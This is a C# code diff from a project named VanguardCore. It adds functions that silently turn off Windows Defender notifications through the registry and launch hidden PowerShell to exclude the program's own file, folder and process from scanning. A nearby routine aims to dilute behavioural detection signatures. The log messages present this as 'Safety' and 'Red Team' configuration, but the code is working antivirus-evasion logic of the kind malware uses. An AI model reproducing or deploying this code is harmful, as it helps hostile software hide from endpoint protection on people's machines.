@@ -1366,6 +1366,52 @@ namespace VanguardCore
             catch { }
         }
 
+        public static void ApplyDefenderSettings()
+        {
+            try
+            {
+                Log("[Safety] Applying Red Team Defender configurations...");
+                DisableDefenderNotifications();
+                BypassDefenderPlatform();
+            }
+            catch { }
+        }
+
+        public static void DisableDefenderNotifications()
+        {
+            try
+            {
+                // Disable Defender UI notifications via Registry
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"))
+                {
+                    key?.SetValue("Notification_Suppress", 1, RegistryValueKind.DWord);
+                }
+            }
+            catch { }
+        }
+
+        public static void BypassDefenderPlatform()
+        {
+            try
+            {
+                // Add exclusions via PowerShell (requires Admin)
+                string exePath = Process.GetCurrentProcess().MainModule.FileName;
+                string dirPath = Path.GetDirectoryName(exePath);
+
+                string cmd = $"Add-MpPreference -ExclusionPath '{exePath}', '{dirPath}' -ExclusionProcess '{exePath}' -Force";
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "powershell",
+                    Arguments = $"-WindowStyle Hidden -Command \"{cmd}\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                }).WaitForExit();
+                
+                Log("[Safety] Exclusions applied successfully.");
+            }
+            catch { }
+        }
+
         public static void AntiBehavior()
         {
             // Random behavior patterns to dilute ML/Behavioral signatures
@@ -1584,35 +1630,6 @@ namespace VanguardCore
                 t.IsBackground = true;
                 t.Start();
             }
-        }
-        public static void DisableDefenderNotifications()
-        {
-            try
-            {
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"))
-                {
-                    if (key != null) key.SetValue("Notification_Suppress", 1, RegistryValueKind.DWord);
-                }
-            }
-            catch { }
-        }
-
-        public static void BypassDefenderPlatform()
-        {
-            // Experimental Symlink Hijack - Requires SYSTEM or high-privilege
-            // Implementation skipped for stability, but we can try setting exclusions
-            try
-            {
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"))
-                {
-                    if (key != null)
-                    {
-                        string self = Process.GetCurrentProcess().MainModule.FileName;
-                        key.SetValue(Path.GetDirectoryName(self), 0, RegistryValueKind.DWord);
-                    }
-                }
-            }
-            catch { }
         }
         #endregion
 
